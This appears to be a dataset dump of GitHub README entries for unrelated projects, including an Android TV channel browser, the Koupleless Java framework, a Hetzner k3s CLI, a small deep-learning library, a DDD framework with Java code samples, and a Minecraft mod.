|   ![image text](doc/docs/image/web/edit.png)    |   ![image text](doc/docs/image/web/tags.png)   |
| ![image text](doc/docs/image/web/category.png)  | ![image text](doc/docs/image/web/comment.png)  |
|   ![image text](doc/docs/image/web/user.png)    |   ![image text](doc/docs/image/web/role.png)   |
|   ![image text](doc/docs/image/web/menu.png)    | ![image text](doc/docs/image/web/dictType.png) |
| ![image text](doc/docs/image/web/dictData.png)  |   ![image text](doc/docs/image/web/log.png)    |
| ![image text](doc/docs/image/web/log-view.png)  |  ![image text](doc/docs/image/web/online.png)  |

### web-show

| web-show                                               | web-show                                               |
|--------------------------------------------------------|--------------------------------------------------------|
| ![image text](doc/docs/image/web-show/index.png)          | ![image text](doc/docs/image/web-show/index-dark.png)     |
| ![image text](doc/docs/image/web-show/article.png)        | ![image text](doc/docs/image/web-show/back.png)           |
| ![image text](doc/docs/image/web-show/category.png)       | ![image text](doc/docs/image/web-show/search.png)         |
| mobile                                                 |  mobile                                                       |
| ![image text](doc/docs/image/web-show/mobile-index.png)   | ![image text](doc/docs/image/web-show/mobile-side.png)    |
| ![image text](doc/docs/image/web-show/mobile-article.png) | ![image text](doc/docs/image/web-show/mobile-comment.png) |

",0,0,2,Apache-2.0
Team-B1ND/dodamdodam-server,master,,0,6,29,
Eanya-Tonic/CCTV_Viewer,master,"<p align=""center""> <img src=""https://github.com/Eanya-Tonic/CCTV_Viewer/blob/master/app/src/main/res/drawable/icon.png"" style=""width:200px;"" /> </p>  <h1 align=""center"">电视浏览器</h1>  <p align=""center"">一个电视机顶盒及Android TV收看网页视频的浏览器 </p>


## 下载安装包
从Github Release下载：https://github.com/Eanya-Tonic/CCTV_Viewer/releases/latest
<br>
从百度网盘下载：https://pan.baidu.com/s/1e5wMCorJIp9oi5yN8mJ1KA?pwd=qozp 提取码：qozp
<br>
从 VoidTech 实验室下载（X5 内核 1.7.4 测试版）：https://void-tech.cn/wp-content/uploads/2024/10/CCTV_Viewer_1.7.4-X5Beta.zip

## 演示视频
**B站：**

[央视浏览器v1.2更新——支持遥控器的电视直播观看软件](https://www.bilibili.com/video/BV1Gc41187D6)

[央视浏览器——一款支持遥控器的便捷电视直播观看软件](https://www.bilibili.com/video/BV1Cg4y1r7Hv)

## 使用方法
**电视盒子：**

![2024-10-03_23-09-27](https://github.com/user-attachments/assets/9dbda531-1976-438a-b293-fd5b5fa002e6#pic_center)

<div align=center><p>频道切换列表界面</p></div>

![2024-10-03_23-09-43](https://github.com/user-attachments/assets/0771c85a-9957-4554-bb98-ebab6f49dba8#pic_center)

<div align=center><p>菜单键功能菜单</p></div>

![2024-10-03_23-09-51](https://github.com/user-attachments/assets/bca3b30b-7ca4-4fa3-a975-05230011ff2f#pic_center)

![2024-10-03_23-09-59](https://github.com/user-attachments/assets/a9f3b5a8-5546-4e95-9eef-ba0e389fd22d#pic_center)

<div align=center><p>设置界面</p></div>

使用上下键切换频道，使用确认键显示当前频道和节目信息、并打开频道切换列表，单击菜单键打开功能菜单，输入数字键换到指定台，双击返回键退出程序。

**其他设备：**

使用键盘方向键上下控制切换频道，使用Enter键显示当前频道和节目信息、并打开频道切换列表，单击键盘M键打开功能菜单，单击键盘B键触发返回，输入数字键换到指定台。

## 目前可看网页

1 CCTV-1 综合

2 CCTV-2 财经

3 CCTV-3 综艺

4 CCTV-4 中文国际（亚）

5 CCTV-5 体育

6 CCTV-6 电影

7 CCTV-7 国防军事

8 CCTV-8 电视剧

9 CCTV-9 纪录

10 CCTV-10 科教

11 CCTV-11 戏曲

12 CCTV-12 社会与法

13 CCTV-13 新闻

14 CCTV-14 少儿

15 CCTV-15 音乐

16 CCTV-16 奥林匹克

17 CCTV-17 农业农村

18 CCTV-5+ 体育赛事

19 CCTV-4 中文国际（欧）

20 CCTV-4 中文国际（美）

21 北京卫视

22 江苏卫视

23 东方卫视

24 浙江卫视

25 湖南卫视

26 湖北卫视

27 广东卫视

28 广西卫视

29 黑龙江卫视

30 海南卫视

31 重庆卫视

32 深圳卫视

33 四川卫视

34 河南卫视

35 福建东南卫视

36 贵州卫视

37 江西卫视

38 辽宁卫视

39 安徽卫视

40 河北卫视

41 山东卫视

## 更新日志
**v1.7.3 更新日志（2024.10.09）**

1.【紧急】修复安卓5以下设备设置闪退导致无法安装X5内核

2.在安卓4.4.2测试X5内核可正常安装启动和播放网页视频

**v1.7.2 更新日志（2024.10.06）**

1.尝试修复本地X5内核安装问题，修改内核包存储目录

2.修改设置中启用X5按钮的用户交互，提升使用体验

3.增加一个X5安装界面，尝试安装X5内核直至安装完成（可能导致app无限重启，如出现无限app重启，清除全部数据或卸载重装app即可恢复系统WebView）

4.默认关闭双缓冲加载

5.降低安装限制到SDK 17

6.64位设备需要46XXX版本的X5内核，但32位设备需要45XXX版本的内核，考虑到大多数需要X5内核的设备都是32位机器，故在apk集成32位X5内核，并在64位设备暂时禁用X5安装（经测试，在64位设备安装32位X5内核会导致闪退和无限重启）

**v1.7.1 更新日志（2024.10.03）**

1.修复应用程序版本号未更新

2.允许用户设置是否按上下键时直接换台，而不是弹出换台抽屉

3.允许用户设置是否在换台抽屉中按返回键时直接关闭抽屉，而不是返回上一级

4.设置界面布局优化

5.尝试修复低网速环境下页面无法正常加载问题

**v1.7 更新日志（2024.09.22）**

_体验调整_

1.精简Android Studio创建Android TV项目时产生的无用模板文件

2.增加一个设置二级界面，增加可自定义换台抽屉字体大小、可定义是否开启双缓冲、可自主决定是否启用X5（仅可用一次）三个选项

3.换台抽屉布局文件调整，提供较小、适中（默认）、偏大、特大四种字体大小可自定义

4.加入双标签页缓冲加载，使用两个WebView分别加载，换台时继续收看上一个频道等待加载；性能较弱设备可在设置中关闭该功能，提升使用体验

5.加入系统webview开关，可自主决定是否启用X5，如系统Webview可以播放则无需关闭该开关（关闭后无法重新开启，关闭后重启后即进入尝试加载X5内核模式）

6.上下键打开换台抽屉，再按确认后换台，避免误触

7.优化换台体验，修改js代码，提高换台速度

8优化央视网换台速度，精简网页元素

9.尝试启用X5无图模式，提高网页加载速度

10.尝试启用硬件加速

11.底部菜单最后一个按钮由“退出程序”修改为“打开设置”

12.取消自动开始播放定时任务，降低程序运行资源占用

_修复Bug_

1.修复x5内核下异常暂停

2.修复WebView抢占焦点

3.修正双击返回逻辑错误

4.修复后台错误驻留

5.启动白屏颜色降低

6.精简换台抽屉布局文件，改为程序生成内容，边框设为自适应

**建议卸载旧版后重新安装，避免出现无法安装、闪退等可能的错误；安卓版本较低的机器，如果已经能够正常使用旧版本，不建议卸载旧版更新，避免新版本无法运行，请以稳定使用优先**

**v1.6.1 更新日志 (2024.06.17)**

1.修复闪退的问题

**v1.6.1 更新日志 (2024.06.06)**

1.修复无限全屏的问题

**v1.6 更新日志 (2024.06.06)**

1.【严重】无法打开地方频道

2.修复无法在程序内修改音量的问题

3.不再自动切换清晰度

4.启用网页缓存（仅系统 WebView）

5.显示系统 WebView 版本号（安卓 7及以上版本才能显示）

6.支持在 GitHub Action 构建，方便调试发版，或者魔改

7.加载网页时禁用自动加载图片，减少卡顿（仅系统 WebView）

**v1.5 更新日志（2024.01.27）**

1.更新菜单键事件逻辑，加入一个底部菜单，并取消原本复杂的双击、单击等机制，使程序更加易用。

2.修改换台菜单逻辑，将原本的弹出界面调整为二级抽屉式菜单，同时改为按确认键触发，更加符合用户的使用习惯；在打开换台界面时，自动切换到目前正在播放的频道。

3.增加一个提示，在换台时会提示目前调用的是系统Webview内核还是腾讯X5内核。

4.修复偶发性的卫视频道播放静音问题。

5.额外更新一个调用系统WebView的版本

**v1.4 更新日志（2024.01.21）**

1.增加央视频的北京卫视、江苏卫视等21个地方卫视频道。

2.尝试修复视频播放暂停的问题，暂时恢复确认键的暂停功能，但是暂停后会自动重新开始播放，仅用于增强兼容性。

3.增加双击确认键可以调整全屏/退出全屏的功能。

4.遥控器左右键可以缩放网页，增强应用兼容性。

5.修改图标、应用名称、增加leanback设置，在原生Android TV启动器上也可以正常显示图标。

6.增加频道选择界面的台号显示，方便数字键换台使用。

7.最低安装限制调整为安卓4.4，API 19。

8.本次更新中，出现了偶发性的卫视频道缩放不正常问题，经测试退出应用再重新打开后可以解决；由于较难复现，我目前不知道问题产生的原因。

**v1.3 更新日志（2024.01.20）**

1.调用本地x5内核，将x5内核集成到安装包中，提高x5内核调用的成功率。

2.自动播放视频，并且禁用确认键暂停功能。

3.修复清晰度选择导致的无法全屏和播放的问题，解决CCTV-6、CCTV-3两个频道由于没有超清清晰度无法选择导致不能全屏和正常播放的问题。 

4.增加频道选择菜单，按菜单键激活后可直接选择需要切换的频道。 

5.修改操作逻辑，按确定键显示当前频道信息、单击菜单键显示频道列表、双击菜单键刷新当前网页。 

**v1.2 更新日志（2024.01.05）**

1.在换台时显示一个“正在切换频道”覆盖层，优化使用体验

2.增加换台后当前频道和当前频道节目预告提示

3.修改按键逻辑，单击菜单键改为显示当前频道和节目信息，长按菜单键改为刷新当前页面

4.改为使用腾讯x5内核，提高程序兼容性

> 下载并安装本软件，即代表您已阅读并同意[腾讯浏览服务X5网页引擎隐私保护规则](https://rule.tencent.com/rule/preview/1c4e2b4b-d0f6-4a75-a5c6-1cfce00a390d)

**v1.1 更新日志（2024.01.04）**

1.优化返回退出逻辑，需要按两次返回键才会退出，避免误触

2.增加数字键换台功能，用户可以通过遥控器上的数字键直接输入台号换台。备注：18号 CCTV-5+ 体育赛事、19号 CCTV-4 中文国际（欧）、20号 CCTV-4 中文国际（美）

",14,54,1,
koupleless/koupleless,main,"[![Coverage Status](https://codecov.io/gh/koupleless/koupleless/branch/main/graph/badge.svg)](https://codecov.io/gh/koupleless/koupleless/branch/main/graph/badge.svg)
![license](https://img.shields.io/badge/license-Apache--2.0-green.svg)
![Maven Central](https://img.shields.io/maven-central/v/com.alipay.sofa.koupleless/koupleless-runtime)

<h1 align=""center"">Koupleless: Modular Development Framework and Serving Platform</h1>

<div align=""center"">

English | [简体中文](./README-zh_CN.md)

</div>

Would you like your application to start in just 10 seconds, consuming only 20MB of memory? Have you encountered issues with large applications causing collaboration bottlenecks and low release efficiency? Are you struggling with the high resource and maintenance costs associated with numerous small applications? If you're facing these challenges, then Koupleless might be the solution you're looking for. Koupleless approaches application architecture from a modular perspective, offering an extremely low-cost solution to address pain points encountered throughout the entire lifecycle of application development, operation, and execution:

1. Excessive application fragmentation leading to high machine and long-term maintenance costs
2. Insufficient application fragmentation causing collaboration bottlenecks
3. Lengthy application build, startup, and deployment times resulting in low iteration efficiency
4. Severe fragmentation of SDK versions with high upgrade costs and long cycles
5. High costs associated with building platforms and middle platforms, as well as difficulties in business asset precipitation and architectural constraints
6. Long microservice chains leading to poor call performance
7. High costs associated with microservice decomposition and evolution

How does Koupleless address these issues? Koupleless vertically and horizontally splits traditional applications, with the vertical split separating the base and the horizontal split separating multiple modules. The base shields modules from infrastructure concerns, while modules contain only the business-specific portion, enabling quick startup and insulating them from infrastructure concerns, allowing module developers to experience a Serverless-like environment. Koupleless thus evolves into a low-cost, Serverless solution by refining the granularity of development and operations while shielding infrastructure. For detailed explanations of the principles, please refer to the official website.
Further detailed explanations of the principles are available on [the official website](https://koupleless.io/docs/introduction/architecture/arch-principle/).

![image](https://github.com/koupleless/koupleless/assets/3754074/004c0fa5-62f6-42d7-a77e-f7152ac89248)

The most important aspect is that Koupleless can **assist existing applications** in evolving into a modular development model **at an extremely low cost**, addressing the aforementioned issues and helping businesses reduce costs, increase efficiency, and enhance competitiveness.

## The Advantages of Koupleless

Koupleless is a mature development framework and operational scheduling platform capability that has been refined internally within Ant Group for 5 years. Compared to traditional image-based application models, it offers approximately 10 times improvement in development, operations, and runtime calling. Summarized into 5 key features: Fast, Cost-efficient, Flexible deployment, Smooth evolution, and Production-scale validation.

<img width=""788"" alt=""image"" src=""https://github.com/sofastack/sofa-serverless/assets/3754074/11d1d662-d33b-482b-946b-bf600aeb34da"">

Here are performance data comparing modular development and deployment with traditional image-based approaches for an actual production application.

<img width=""600"" alt=""image"" src=""https://github.com/koupleless/koupleless/assets/3754074/913a6f11-54cb-4c8b-b417-d014e53c920a""/>

## What is a Module?

Modules utilize extreme sharing and isolation technologies, which enable hot deployment (updating online code without restarting the machine).

Isolation is achieved through ClassLoader class isolation based on [SOFAArk](https://github.com/sofastack/sofa-ark) and object isolation based on [SpringBoot SpringContext](https://github.com/spring-projects/spring-boot).

Sharing is facilitated by class delegation loading based on [SOFAArk](https://github.com/sofastack/sofa-ark) and cross-SpringContext object lookup and invocation based on SpringBootManager.

So, in physical terms, a module can be considered as one ClassLoader + one SpringContext.

## What is the Base？
The base is just a regular application, same with the original app (such as standard SpringBoot).

## Quick start
Please check [the official website Quick Start](https://koupleless.io/docs/quick-start/).

https://github.com/koupleless/koupleless/assets/3754074/e44c9406-4bd4-4fcf-babc-4ae9e615984e

## Koupleless Components

![image](https://github.com/sofastack/sofa-serverless/assets/101314559/995f1e17-f3be-4672-b1b8-c0c041590fb0)

## Contributing
We appreciate anyone who contribute here together. Please scan the QR code to join the developer collaboration group.

| IAM                        | number      | QR code                                                                                                                          |
|----------------------------|-------------|----------------------------------------------------------------------------------------------------------------------------------|
| DingTalk group (recommand) | 24970018417 | <img width=""256"" alt=""image"" src=""https://github.com/koupleless/koupleless/assets/3754074/7ba1db74-20c1-43a4-a2ab-d38c99a920cd""> |
| WeChat                     | zzl_ing     | <img width=""256"" alt=""image"" src=""https://github.com/koupleless/koupleless/assets/3754074/35ebc2bc-86cd-4a24-b12e-e9f44cccc2d7""> |

you can also join us by [discord](https://discord.gg/bqx9RDbSfF)

## Long-term planning and our vision
We hope to further refine and open up these capabilities to be more extreme and applicable to a wider range of scenarios. Help more businesses solve application development problems, achieve cost reduction and efficiency improvement, and ultimately become an excellent research and development framework and solution for global green computing, achieving:

1. Speed as you need
2. Pay as you need
3. Deploy as you need
4. Evolution as you need

<img width=""1069"" alt=""image"" src=""https://github.com/koupleless/koupleless/assets/3754074/17ebd41d-38c7-46e8-a4ba-b6b8bf8f76dd"">
",17,61,16,Apache-2.0
d1tto/Rengar,master,"# Rengar

**Rengar** is the prototype of paper ""Effective ReDoS Detection by Principled Vulnerability Modeling and Exploit Generation"" published in S&P'23.",0,1,1,
FRC-Team-1403/Robot2024,main,"# Robot2024
",0,0,24,NOASSERTION
flynt-3650/java-exam-practice,main,"# README

**ДИСКЛЕЙМЕР: СОЗДАТЕЛЬ И КОНТРИБЬЮТОРЫ НЕ ОДОБРЯЮТ СПИСЫВАНИЕ НА ЭКЗАМЕНАХ.
РЕПОЗИТОРИЙ СОЗДАН ИСКЛЮЧИТЕЛЬНО В ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ. ДУМАЙТЕ СВОЕЙ ГОЛОВОЙ.**

Чтобы найти решение интересующего задания:

1. Зайдите в файл ""[Tasks.md](Tasks.md)"" и используйте сочетание клавиш CTRL + F для поиска текста вашего задания в файле.
2. Сопоставьте номер билета с названием пакета в папке ""[src](src)"".


Для того, чтобы склонировать репозиторий на свой ПК, откройте Git Bash в месте куда вы хотите сохранить реп. и введите: `git clone https://github.com/fl-3650/JavaExamPractice.git`. Лайфхак: нажмите по пустому месту в начале поля ввода команды правой кнопкой мыши, команда вставится автоматически.

",0,0,1,
easystartup-io/k3s-simplified,main,"<!-- PROJECT LOGO -->
<br />
<p align=""center"">
  <a href=""https://github.com/easystartup-io/k3s-simplified"">
    <img src=""https://github.com/easystartup-io/k3s-simplified/raw/main/docs/static/img/logo.png"" alt=""Logo"" width=""112"" height=""112"">

  </a>

<h2 align=""center"">k3s-simplified</h2>

  <p align=""center"">
    Best simplified way to create a fully functional kubernetes cluster in production on <a href=""https://hetzner.com"" target=""_blank"">Hetzner Cloud</a> using CLI (command line interface) 
  </p>
  <hr />
</p>

# Full Documentation

Access comprehensive instructions at: **[https://k3s-simplified.easystartup.io/docs/](https://k3s-simplified.easystartup.io)**

---

Its a fully open source(MIT LICENSE) drop in replacement to hetzner-k3s written in java, which runs as a single binary, no extra dependency needed


## Project Background

1. This project originated as a fork of [hetzner-k3s](https://github.com/vitobotta/hetzner-k3s).
2. Rewritten in Java for cross-platform compatibility and my familiarity with the language.
3. Actively maintained for production use.
4. I offer full support, including paid consultancy (contact details available [here](https://k3s-simplified.easystartup.io/docs/contact-me)).
5. Emphasis on developing a private, isolated cluster setup, crucial for production environments to safeguard against unauthorized external access.

## About the Tool

A command-line interface (CLI) for effortlessly creating and managing Kubernetes clusters in [Hetzner Cloud](https://www.hetzner.com/cloud). It utilizes [k3s](https://k3s.io/) by [Rancher](https://rancher.com/) for a lightweight Kubernetes experience.

## License

Distributed freely under the [MIT License](https://github.com/easystartup-io/k3s-simplified/blob/main/LICENSE.txt)

## Acknowledgments and shout out to

1. [hetzner-k3s](https://github.com/vitobotta/hetzner-k3s): was the starting point for this project. The inspiration for this project and the basis for expanding my own cluster.
2. [hetznercloud-java](https://github.com/tomsiewert/hetznercloud-java): Essential for cloud API integration. Contributing back to this community project was enriching, especially with the rapid acceptance of my PRs addressing Hetzner API changes.
",16,0,1,MIT
worldsat/project39,main,"https://www.youtube.com/@UiLover
",0,1,1,
cubk1/vapev3-opensource,master,"# VapeV3
#clientshutdown

Font Renderer is deleted due to it made by my friend, Please add new one by you self.

VapeV4.11 source release soon :)

![](img.png)",0,1,1,
Leavesfly/TinyDL-0.01,main,"## 1，TinyDL的整体架构
![img.png](img.png)

TinyDL的秉承简洁分层清晰的原则，并参考了通用的分层逻辑，整体的结构如下：
* 1，ndarr包：核心类 NdArray，底层线性代数的简单实现，目前只实现CPU版本，GPU版本需要依赖庞大的三方库。
* 2，func包：核心类Function与Variable 分别是抽象的数学函数与变量的抽象，用于在前向传播时自动构建计算图，实现自动微分功能，其中Variable对应PyTorch的tensor。
* 3，nnet包：核心类Layer与Block表示神经网络的层和块，任何复杂的深度网络都是依赖这些Layer与Block的堆叠而层。实现了一些常用的cnn层rnn层norm层以及encode与decode的seq2seq架构等等。
* 4，mlearning 包：机器学习的通用组件的表示，深度学习是机器学习的一个分支，对应更广泛的机器学习有一套通用的组件，包括数据集，损失函数，优化算法，训练器，推导器，效果评估器等。
* 5，modality 包：属于应用层的范畴，目前深度学习主要应用任务图形图像的视觉，自然语言处理以及强化学习三部分，暂时还没有相应的领域的实现，希望在0.02版中实现GPT-2的原型。
* 6，example包：一些简单的能跑通的例子，主要包括机器学习的分类和回归两类问题，有曲线的拟合，螺旋曲线的分类，手写数字的识别以及序列数据的预测。",0,1,3,
chensheng/ddd-boot,master,"# DDD-BOOT
DDD (Domain-Driven Design) 领域驱动设计工程化落地框架

* [快速开始](#快速开始)
* [架构说明](#架构说明)
* [通用组件](#通用组件)
* [示例讲解](#示例讲解)

## 快速开始

### 创建项目
```shell
mvn archetype:generate \
 -DgroupId=org.example \
 -DartifactId=ddd-example \
 -Dversion=1.0.0-SNAPSHOT \
 -Dpackage=org.example.ddd \
 -DarchetypeGroupId=io.github.chensheng \ 
 -DarchetypeArtifactId=ddd-microservice-archetype \ 
 -DarchetypeVersion=1.0.0-SNAPSHOT
```

### 运行项目
```shell
mvn spring-boot:run
```

## 架构说明

### 概述
![架构图](docs/架构图.jpg)

框架采用4层架构，分别为接口层、应用层、领域层、基础设施层。

### 分层说明

#### 接口层
对外提供REST接口，按调用方的不同进行分包。

#### 应用层
负责业务逻辑的编排，不负责具体的业务逻辑。

`应用服务`
对应到一个具体的业务场景，通过编排实体、聚合、仓储、领域服务来完成。
按照CQRS(命令查询职责分离)模式将应用服务分为CommandService和QueryService。
CommandService完成会改变系统状态的业务场景（写操作），只能依赖于领域层。
QueryService完成查询数据的业务场景（读操作），可穿透领域层，直接调用基础设施层的数据库查询方法。

`DTO`
分为Command、Query、Result三类。Command和Query为应用服务的入参，Result为应用服务的返回结果。
Command为CommandService的入参。Query为QueryService的入参。

#### 领域层
核心层，完全独立，不依赖其他层。该层沉淀了整个业务域中的业务领域模型，核心的业务逻辑都在这层。

`实体`
业务对象，具有业务属性和业务行为。

`值对象`
相关属性的集合，对实体的状态、特征进行业务语义的描述。

`聚合`
由业务逻辑紧密关联的实体组成的。

`领域服务`
当业务逻辑不属于任何实体和聚合时，可将其放在领域服务中。设计领域服务的一个原则是：如无必要，勿写领域服务。

`仓储`
对资源访问的抽象，包括数据库、文件、微服务、外部系统等资源。领域层只定义仓储的接口，具体实现在基础设施层完成。

#### 基础设施层
负责与其他微服务、外部系统、数据库及Redis等其他中间件的交互。

`项目配置`
项目工程与技术相关的配置，比如拦截器、MyBatis、Redis等配置。

`仓储实现`
根据领域层定义的仓储接口，实现仓储的具体功能。

`对象转换器`
使用[MapStruct](https://mapstruct.org)完成各层对象的转换，包括DTO、实体、聚合、值对象、PO等对象。
```java
@Mapper(componentModel = MappingConstants.ComponentModel.SPRING)
public interface ExampleConvertor {
    Example toExamplePo(ExampleEntity entity);
}
```

### 架构校验
通过测试用例校验代码是否符合DDD规范，防止开发者写代码时冲破架构。
```java
public class DDDArchitectureTest {
    @Test
    public void testDDDArchitecture() {
        ArchitectureTest.validateDDD(""org.example"");
    }
}
```

## 通用组件
[通用组件介绍](/ddd-boot/README.md)


## 示例讲解
[示例代码](/ddd-archetypes/ddd-microservice)

针对简单的增删改查业务，通过继承、实现通用的`Entity` `DataObject` `Result` `Repository` `Convertor` `Mapper`，避免编写重复的代码。

### 创建领域模型
实现`DDDEntity`，补充领域属性、领域行为。
```java
@Getter
@Builder
public class ExampleEntity implements DDDEntity {
    /*============= 领域属性 start ================*/
    private Long id;

    private String username;

    private String password;

    private ExampleStatus status;
    /*============= 领域属性 end ================*/

    
    /*============= 领域行为 start ================*/
    /**
     * 新建用户
     * @param username 用户名；必传
     * @param password 密码；必传
     * @return
     */
    public static ExampleEntity create(String username, String password) {
        if(TextUtil.isBlank(username)) {
            throw new BizException(""用户名不能为空"");
        }
        if(TextUtil.isCNWord(username)) {
            throw new BizException(""用户名不能包含中文"");
        }
        if(TextUtil.isBlank(password)) {
            throw new BizException(""密码不能为空"");
        }
        if(password.length() < 6) {
            throw new BizException(""密码不能少于6位数"");
        }

        ExampleEntity user = builder()
                .username(username)
                .password(password)
                .status(ExampleStatus.ENABLE)
                .build();
        user.checkPasswordFormat();
        return user;
    }

    /**
     * 修改密码
     * @param oldPassword 原密码；必传
     * @param newPassword 新密码；必传
     */
    public void updatePassword(String oldPassword, String newPassword) {
        if(TextUtil.isBlank(oldPassword)) {
            throw new BizException(""原密码不能为空"");
        }
        if(TextUtil.isBlank(newPassword)) {
            throw new BizException(""新密码不能为空"");
        }
        if(newPassword.length() < 6) {
            throw new BizException(""密码不能少于6位数"");
        }
        if(!this.password.equals(oldPassword)) {
            throw new BizException(""原密码错误"");
        }
        if(oldPassword.equals(newPassword)) {
            throw new BizException(""新密码不能与旧密码相同"");
        }

        this.password = newPassword;
        this.checkPasswordFormat();
    }

    /**
     * 启用用户
     */
    public void enable() {
        if(this.status == ExampleStatus.ENABLE) {
            throw new BizException(""用户已是启用状态"");
        }

        this.status = ExampleStatus.ENABLE;
    }

    /**
     * 停用用户
     */
    public void disable() {
        if(this.status == ExampleStatus.DISABLE) {
            throw new BizException(""用户已是禁用状态"");
        }

        this.status = ExampleStatus.DISABLE;
    }
    /*============= 领域行为 end ================*/

    private void checkPasswordFormat() {
        String passwordFormat = ""^(?![A-Za-z0-9]+$)(?![a-z0-9\\W]+$)(?![A-Za-z\\W]+$)(?![A-Z0-9\\W]+$)[a-zA-Z0-9\\W]{8,}$"";
        if(TextUtil.isBlank(password) || !password.matches(passwordFormat)) {
            throw new BizException(""密码必须由数字、字母、特殊字符_#@!组成，且不能少于8位！"");
        }
    }
}
```

### 创建Result对象
API的返回结果
```java
@Data
public class ExampleResult {
    private Long id;

    private String username;
}
```

### 创建数据对象及Mapper
继承`DataObject`, 或实现`IDataObject`
```java
@Data
public class Example extends DataObject {
    private String username;

    private String password;

    private ExampleStatus status;
}
```

继承`BaseMapper`
```java
public interface ExampleMapper extends BaseMapper<Example> {
}
```

### 创建仓储
继承`DDDRepository`
```java
public interface ExampleRepository extends DDDRepository<ExampleEntity> {
}
```

继承`DDDRepositoryImpl`
```java
@Component
public class ExampleRepositoryImpl extends DDDRepositoryImpl<ExampleEntity, Example, ExampleConvertor, ExampleMapper> implements ExampleRepository {
}
```

### 查询功能

#### QueryService
继承`DDDQueryService`
```java
public interface ExampleQueryService extends DDDQueryService<ExampleResult> {
}
```

继承`DDDQueryServiceImpl`
```java
@Service
public class ExampleQueryServiceImpl extends DDDQueryServiceImpl<ExampleEntity, Example, ExampleResult, ExampleConvertor, ExampleMapper> implements ExampleQueryService {
}
```

#### Query
创建分页查询Query， 继承`PageQuery`
```java
@Data
public class ExamplePageQuery extends PageQuery {
    @QuerySortable
    private String username;

    @QueryCondition(column = ""username"", operator = ConditionOperator.like)
    private String usernameLike;

    @QuerySortable(order = OrderType.DESC)
    private ExampleStatus status;

    @Override
    protected Long getMaxSize() {
        return 20l;
    }
}
```

创建列表查询Query，继承`ListQuery`
```java
@Data
public class ExampleListQuery extends ListQuery {
    @QuerySortable
    private String username;

    @QueryCondition(column = ""username"", operator = ConditionOperator.like)
    private String usernameLike;

    @QuerySortable(order = OrderType.DESC)
    private ExampleStatus status;

    @Override
    protected Long getMaxLimit() {
        return 10l;
    }
}
```

#### API
```java
@RestController
@RequestMapping(""/web/example"")
public class ExampleController {
    @Autowired
    private ExampleQueryService exampleQueryService;

    @GetMapping(""/page"")
    public Page<ExampleResult> page(@Valid ExamplePageQuery query) {
        return exampleQueryService.page(query);
    }

    @GetMapping(""/list"")
    public List<ExampleResult> list(@Valid ExampleListQuery query) {
        return exampleQueryService.list(query);
    }

    @GetMapping(""/{id}"")
    public ExampleResult detail(@PathVariable Long id) {
        return exampleQueryService.detail(id);
    }
}
```

### 增删改功能

#### Command
```java
@Data
public class ExampleCreateCommand {
    @NotEmpty(message = ""请输入用户名"")
    private String username;

    @NotEmpty(message = ""请输入密码"")
    private String password;
}
```

```java
@Data
public class ExampleUpdatePasswordCommand {
    @NotEmpty(message = ""请输入旧密码"")
    private String oldPassword;

    @NotEmpty(message = ""请输入新密码"")
    private String newPassword;
}
```

#### CommandService
```java
public interface ExampleCommandService {
    void create(ExampleCreateCommand command);

    void update(ExampleUpdatePasswordCommand command);

    void enable(Long id);

    void disable(Long id);

    void delete(Long id);
}
```

```java
@Service
@Transactional
public class ExampleCommandServiceImpl implements ExampleCommandService {
    @Autowired
    private ExampleRepository exampleRepository;

    @Override
    public void create(ExampleCreateCommand command) {
        ExampleEntity entity = ExampleEntity.create(command.getUsername(), command.getPassword());
        exampleRepository.save(entity);
    }

    @Override
    public void update(ExampleUpdatePasswordCommand command) {
        Long userId = securityRepository.getLoginUser();
        ExampleEntity entity = exampleRepository.getById(userId);
        entity.updatePassword(command.getOldPassword(), command.getNewPassword());
        exampleRepository.save(entity);
    }

    @Override
    public void enable(Long id) {
        ExampleEntity entity = exampleRepository.getById(id);
        entity.enable();
        exampleRepository.save(entity);
    }

    @Override
    public void disable(Long id) {
        ExampleEntity entity = exampleRepository.getById(id);
        entity.disable();
        exampleRepository.save(entity);
    }

    @Override
    public void delete(Long id) {
        ExampleEntity entity = exampleRepository.getById(id);
        exampleRepository.remove(entity);
    }
}
```

#### API
```java
@RestController
@RequestMapping(""/web/example"")
public class ExampleController {
    @Autowired
    private ExampleCommandService exampleCommandService;
    
    @PostMapping
    public void create(@Valid @RequestBody ExampleCreateCommand command) {
        exampleCommandService.create(command);
    }

    @PutMapping(""/password"")
    public void updatePassword(@Valid @RequestBody ExampleUpdatePasswordCommand command) {
        exampleCommandService.update(command);
    }

    @PutMapping(""/{id}/enabled"")
    public void enable(@PathVariable Long id) {
        exampleCommandService.enable(id);
    }

    @PutMapping(""/{id}/disabled"")
    public void disable(@PathVariable Long id) {
        exampleCommandService.disable(id);
    }

    @DeleteMapping(""/{id}"")
    public void delete(@PathVariable Long id) {
        exampleCommandService.delete(id);
    }
}
```




",0,0,1,
Rozmir-Rohi/mo-creatures-legacy,main,"# Mo Creatures Legacy
<strong> Project Status:</strong> On Hold (future update(s) planned)

<br><br>


The final version of Mo' Creatures for 1.7.10 was unfinished and was riddled with bugs. This project fixes that.

The main aim of Mo' Creatures Legacy is to provide a fully working legacy version of Mo' Creatures for 1.7.10.

<br><br>

<strong> DISCLAIMER: </strong>
* This project is not endorsed by Dr Zhark or anyone from the original Mo' Creatures team.
* This project does not backport features from newer versions of Mo' Creatures.
 

 
## How to Install:
Mo' Creatures Legacy is a stand-alone mod and does NOT require any other mods as dependencies.
Assuming you have Java 8 installed on your computer and Forge installed for 1.7.10, just download the mod and put it into the mods folder. 

Do NOT try to use this mod with the Custom Mob Spawner mod, if you need to adjust entity spawns use the Just Another Mob Spawner instead.

Do NOT try to load this mod into a world that previously had the original Mo' Creatures mod.

 


<details>
<summary><h2>Credits & Assets Used:</h2></summary>
<strong>DrZhark, Bloodshot, BlockDaddy and remaining Original Mo' Creatures contributers </strong> - This project is a modified version of DrZhark's Mo' Creatures Mod v6.3.1 for Minecraft 1.7.10 and is licensed under the ""GNU General Public License v3.0 and Further Conditions"" custom license which satisfies the GNU General Public License Version 3 as per the conditions of the original project's license. DrZhark's Mo' Creatures Mod Original Forum Post:  http://www.minecraftforum.net/viewtopic.php?f=25&t=86929
<br><br>

<strong> crazyspacekid </strong> - Entity textures were overhauled with the application of modified textures from the Mo' Creatures 16x texture pack. This asset was used with permission from the owner and proof of permission can be found inside the assets folder of the mod jar archive as an image file. All changes to original 16x textures have been documented in the ""Rozmirs modifications to Mo Creature 16x Textures"" text file inside the assets folder of the jar archive. Curseforge Project Link: https://www.curseforge.com/minecraft/texture-packs/mo-creatures-16x
<br><br>
 
